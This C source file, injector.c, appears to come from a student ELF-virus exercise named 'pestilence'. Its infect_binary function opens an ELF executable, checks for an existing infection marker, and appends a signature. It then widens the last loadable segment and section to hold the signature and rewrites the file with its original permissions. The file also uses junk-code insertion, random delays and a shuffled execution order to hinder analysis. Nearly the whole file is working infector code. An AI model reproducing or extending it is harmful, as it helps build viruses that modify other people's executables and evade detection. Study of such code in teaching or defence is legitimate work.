/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   injector.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/07 16:03:22 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 19:15:02 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/pestilence.h"

static int write_infected_file(const char *filepath, void *data, size_t size)
{
    int fd;
    ssize_t written;
    struct stat st;
    mode_t original_mode = 0644;
    
    // Obtener permisos originales
    if (stat(filepath, &st) == 0) {
        original_mode = st.st_mode;
    }
    
    // Escribir archivo
    fd = custom_open(filepath, O_WRONLY | O_TRUNC);
    if (fd < 0)
        return -1;
    
    written = custom_write(fd, data, size);
    
    // Restaurar permisos
    fchmod(fd, original_mode);
    custom_close(fd);
    
    if (written < 0 || (size_t)written != size)
        return -1;
    
    return 0;
}

int infect_binary(const char *filepath)
{
    t_elf elf = {0};
    const char *sig;
    size_t sig_len;
    void *new_data = NULL;
    size_t new_size;
    size_t original_size;
    Elf64_Ehdr *new_ehdr;
    Elf64_Phdr *new_phdr;
    Elf64_Shdr *new_shdr;
    int ret = -1;
    
	insert_garbage();

	int order = get_execution_order();

    // 1. Parsear ELF
    if (order == 0 || order == 1) {
        if (parse_elf(filepath, &elf) < 0)
            return -1;
        insert_garbage();
    }
    
    // 3. Obtener firma
    if (order == 2 || order == 3) {
        sig = get_signature();
        sig_len = strlen(sig) + 1;
        random_delay();
    }

	if (order == 2 || order == 3) {
        if (parse_elf(filepath, &elf) < 0)
            return -1;
        insert_garbage();
    }
    
	if (order == 0 || order == 1) {
        sig = get_signature();
        sig_len = strlen(sig) + 1;
        insert_garbage();
    }

	insert_garbage();
    
    if (is_infected(&elf)) {
        cleanup_elf(&elf);
        return 0;
    }

	random_delay();

    // 4. Guardar tamaño original ANTES de cleanup
    original_size = elf.size;
    
    // 5. Crear nuevo buffer con espacio adicional
    new_size = original_size + sig_len;
    new_data = malloc(new_size);
    if (!new_data) {
        cleanup_elf(&elf);
        return -1;
    }
    
	insert_garbage();

    // 6. Copiar archivo original
    memcpy(new_data, elf.data, original_size);
    
    // 7. Ya podemos hacer cleanup del mmap
    cleanup_elf(&elf);
    
    // 8. Añadir firma al final
    memcpy((char *)new_data + original_size, sig, sig_len);
    
    // 9. Actualizar headers
    new_ehdr = (Elf64_Ehdr *)new_data;
    new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
    new_shdr = (Elf64_Shdr *)((char *)new_data + new_ehdr->e_shoff);
    
    // 10. Encontrar último segmento PT_LOAD y expandirlo
    for (int i = 0; i < new_ehdr->e_phnum; i++) {
        if (new_phdr[i].p_type == PT_LOAD) {
            // Expandir el último segmento PT_LOAD
            if (new_phdr[i].p_offset + new_phdr[i].p_filesz == original_size) {
                new_phdr[i].p_filesz += sig_len;
                new_phdr[i].p_memsz += sig_len;
                break;
            }
        }
    }
    
    // 11. Encontrar última sección y expandirla
    int last_section = -1;
    size_t max_offset = 0;
    for (int i = 0; i < new_ehdr->e_shnum; i++) {
        size_t section_end = new_shdr[i].sh_offset + new_shdr[i].sh_size;
        if (section_end > max_offset && section_end <= original_size) {
            max_offset = section_end;
            last_section = i;
        }
    }
    
	insert_garbage();

    if (last_section >= 0) {
        new_shdr[last_section].sh_size += sig_len;
    }
    
    // 12. Escribir archivo infectado
    ret = write_infected_file(filepath, new_data, new_size);
    
    // 13. Limpiar
    free(new_data);
    
    return ret;
}